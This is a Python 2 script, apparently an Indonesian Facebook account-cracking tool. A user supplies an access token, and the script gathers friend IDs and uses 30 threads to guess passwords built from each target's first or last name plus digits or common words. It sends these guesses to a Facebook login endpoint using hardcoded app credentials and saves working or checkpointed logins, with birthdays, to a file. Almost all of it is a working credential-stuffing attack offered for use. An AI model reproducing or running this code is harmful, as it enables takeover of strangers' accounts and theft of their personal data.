#!/usr/bin/python2
#coding=utf-8
#rayy

#import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 Ray.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36')]

def keluar():
	print ("[!] Exit")
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)



#########LOGO#########
logo = """
\033[1;97m|1 44    4 55555•   •00•   AUTHOR: Ray Pramuja
\033[1;97m|1 4 4   4 55   55 00  00  FACEBOOK: ANANDA PUTRA EX
\033[1;97m|1 4  4  4 55   55 00  00  WA 08387767397X
\033[1;97m|1 4   4 4 55   55 00  00  
\033[1;97m|1 4    44 55555•   •00•   
"""
########LOGO#########
cowsay = """
\033[1;97m AUTHOR: Ray Pramuja
\033[1;97m FACEBOOK: ANANDA PUTRA EX
\033[1;97m WA: 08387767397X
"""
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
vulnot = "Not Vuln"
vuln = "Vuln"

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\033[1;97m _______________________________________"
	print "\033[1;97m 1.)\033[1;97m Login Dengan Token"
	print "\033[1;97m 2.)\033[1;97m Ambil Token"
	print "\033[1;97m 0.)\033[1;97m Keluar"
	print "\033[1;97m _______________________________________"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;97m Pramuja:) ")
	if msuk =="":
		print"\033[1;97m Isi Yang Bener Nyet !" '\n'
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="2"or msuk =="02":
		Ambil_Token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m Isi Sing Bener Cok !"
		pilih_masuk()


#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	print '_______________________________________'
	toket = raw_input("\033[1;97m Paste Token Samping Sini:")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;92m Token Bener ✓')
		menu()
	except KeyError:
		print "\033[1;93m Token Salah Cok !"
		time.sleep(1)
		masuk()

######AMBIL_TOKEN######
def Ambil_Token():
	os.system("clear")
	print logo
	print 50* "\033[1;97m─"
	jalan("\033[1;97mAnda Akan Di Arahkan Ke Browser Lalu Search 'eaaa' Kemudian Copy Token.")
	os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed')
	time.sleep(3)
	masuk()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91m Token is invalid !"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print" Tidak Ada Internet"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;97m _______________________________________"
	print "\033[1;97m Selamat Datang\033[1;97m "+nama
	print "\n\033[1;97m USER ID\033[1;97m         ->\033[1;97m "+id
	print "\033[1;97m Tanggal Lahir\033[1;97m   ->\033[1;97m "+ a['birthday']
	print "\033[1;97m _______________________________________"
	print "\033[1;97m 1.) Mulai Crack"
	print "\033[1;97m 2.) Ambil Id Dengan Username"
	print "\033[1;97m 0.) Logout \n"
	pilih()

######PILIH######
def pilih():
	unikers = raw_input("\033[1;97m rayy:) ")
	if unikers =="":
		print "\033[1;97m _______________________________________"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="2" or unikers =="02":
		id_gen()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m Isi Sing Bener Cok !"
		pilih()


########## CRACK INDONESIA #######
def indo():
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m Token Is Invalid !"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	print "\033[1;97m _______________________________________"
	print "\033[1;97m 1.) Crack Dari Daftar Teman"
	print "\033[1;97m 2.) Crack Dari Publik"
	print "\033[1;97m 0.) Kembali \n"
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input("\033[1;97m Rayy:) ")
	print "\033[1;97m _______________________________________"
	if teak =="":
		print"\033[1;97m Isi Yang Bener Nyet !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
	        idt = raw_input("\033[1;97m Masukan ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m ID Tidak Ada !"
			raw_input("\n Kembali ")
			indo()
		except requests.exceptions.ConnectionError:
			print"[ Ora Ono Internet !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m Isi Sing Bener Cok !"
		pilih_indo()
	
	print "\033[1;97m Total ID : "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m Otw Crack "+o),;sys.stdout.flush();time.sleep(1)

	print "\n\033[1;97m _______________________________________"
	print "\033[1;97m Tekan CTRL+Z untuk berhenti,"
	print "\033[1;97m Mode Pesawat jika tidak ada hasil"
	print "\033[1;97m _______________________________________"
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
				z = json.loads(x.text)
				print '\033[1;92m --> ' + user + '|' + pass1 + '|' + c['birthday']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[1;93m --> ' + user + '|' + pass1 + '|' + c['birthday']
					cek = open("out/super_cp.txt", "a")
					cek.write("\nID:" +user+ " Pw:" +pass1+ " TTL:" +c['birthday'])
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
						z = json.loads(x.text)
						print '\033[1;92m --> ' + user + '|' + pass2 + '|' + c['birthday']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[1;93m --> ' + user + '|' + pass2 + '|' + c['birthday']
							cek = open("out/super_cp.txt", "a")
							cek.write("\nID:" +user+ " Pw:" +pass2+ " TTL:" +c['birthday'])
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = c['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
								z = json.loads(x.text)
								print '\033[1;92m --> ' + user + '|' + pass3 + '|' + c['birthday']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[1;93m --> ' + user + '|' + pass3 + '|' + c['birthday']
									cek = open("out/super_cp.txt", "a")
									cek.write("\nID:" +user+ " Pw:" +pass3+ " TTL:" +c['birthday'])
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = c['last_name']+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
										z = json.loads(x.text)
										print '\033[1;92m --> ' + user + '|' + pass4 + '|' + c['birthday']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\033[1;93m --> ' + user + '|' + pass4 + '|' + c['birthday']
											cek = open("out/super_cp.txt", "a")
											cek.write("\nID:" +user+ " Pw:" +pass4+ " TTL:" +c['birthday'])
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = c['last_name']+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
												z = json.loads(x.text)
												print '\033[1;92m --> ' + user + '|' + pass5 + '|' + c['birthday']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\033[1;93m --> ' + user + '|' + pass5 + '|' + c['birthday']
													cek = open("out/super_cp.txt", "a")
													cek.write("\nID:" +user+ " Pw:" +pass5+ " TTL:" +c['birthday'])
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = c['last_name']+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
														z = json.loads(x.text)
														print '\033[1;92m --> ' + user + '|' + pass6 + '|' + c['birthday']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\033[1;93m --> ' + user + '|' + pass6 + '|' + c['birthday']
															cek = open("out/super_cp.txt", "a")
															cek.write("\nID:" +user+ " Pw:" +pass6+ " TTL:" +c['birthday'])
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Sayang'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																z = json.loads(x.text)
																print '\033[1;92m --> ' + user + '|' + pass7 + '|' + c['birthday']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\033[1;93m --> ' + user + '|' + pass7 + '|' + c['birthday']
																	cek = open("out/super_cp.txt", "a")
																	cek.write("\nID:" +user+ " Pw:" +pass7+ " TTL:" +c['birthday'])
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = 'kontol'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																		z = json.loads(x.text)
																		print '\033[1;92m --> ' + user + '|' + pass8 + '|' + c['birthday']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\033[1;93m --> ' + user + '|' + pass8 + '|' + c['birthday']
																			cek = open("out/super_cp.txt", "a")
																			cek.write("\nID:" +user+ " Pw:" +pass8+ " TTL:" +c['birthday'])
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																				pass9 = 'anjing'
																				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																				w = json.load(data)
																				if 'access_token' in w:
																					x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																					z = json.loads(x.text)
																					print '\033[1;92m --> ' + user + '|' + pass9 + '|' + c['birthday']
																					oks.append(user+pass9)
																				else:
																					if 'www.facebook.com' in w['error_msg']:
																						print '\033[1;93m --> ' + user + '|' + pass9 + '|' + c['birthday']
																						cek = open("out/super_cp.txt", "a")
																						cek.write("\nID:" +user+ " Pw:" +pass9+ " TTL:" +c['birthday'])
																						cek.close()
																						cekpoint.append(user+pass9)
																					else:
																		 				pass10 = 'Bangsat'
																						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																						w = json.load(data)
																						if 'access_token' in w:
																							x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																							z = json.loads(x.text)
																							print '\033[1;92m --> ' + user + '|' + pass10 + '|' + c['birthday']
																							oks.append(user+pass10)
																						else:
																							if 'www.facebook.com' in w['error_msg']:
																								print '\033[1;93m --> ' + user + '|' + pass10 + '|' + c['birthday']
																								cek = open("out/super_cp.txt", "a")
																								cek.write("\nID:" +user+ " Pw:" +pass10+ " TTL:" +c['birthday'])
																								cek.close()
																								cekpoint.append(user+pass10)
																							else:
																								pass11 = c['first_name']
																								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																								w = json.load(data)
																								if 'access_token' in w:
																									x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																									z = json.loads(x.text)
																									print '\033[1;92m --> ' + user + '|' + pass11 + '|' + c['birthday']
																									oks.append(user+pass11)
																								else:
																									if 'www.facebook.com' in w['error_msg']:
																										print '\033[1;93m --> ' + user + '|' + pass11 + '|' + c['birthday']
																										cek = open("out/super_cp.txt", "a")
																										cek.write("\nID:" +user+ " Pw:" +pass11+ " TTL:" +c['birthday'])
																										cek.close()
																										cekpoint.append(user+pass11)
																									else:
																										pass12 = c['last_name']
																										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																										w = json.load(data)
																										if 'access_token' in w:
																											x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																											z = json.loads(x.text)
																											print '\033[1;92m --> ' + user + '|' + pass12 + '|' + c['birthday']
																											oks.append(user+pass12)
																										else:
																											if 'www.facebook.com' in w['error_msg']:
																												print '\033[1;93m --> ' + user + '|' + pass12 + '|' + c['birthday']
																												cek = open("out/super_cp.txt", "a")
																												cek.write("\nID:" +user+ " Pw:" +pass12+ " TTL:" +c['birthday'])
																												cek.close()
																												cekpoint.append(user+pass12)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m _______________________________________"
	print '\033[1;97m Selesai ....'
	print"\033[1;97m Total \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m File CP Tersimpan : out/super_cp.txt'
	print "\033[1;97m _______________________________________"
	raw_input("\033[1;97m [ Kembali ] ")
	os.system("python2 ryn.py")

##### USERNAME ID ####
def id_gen():
	os.system('clear')
	print logo
	print 50* "\033[1;97m─"
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("\033[1;97m -> Username : ")
	idre = re.compile('"entity_id":"([0-9]+)"')
	page = requests.get(url)
	print idre.findall(page.content)
	raw_input("\n\033[1;97m Enter Untuk Kembali :)")
	menu()

if __name__=='__main__':
    menu()
    masuk()

#Jangan asal recode anjing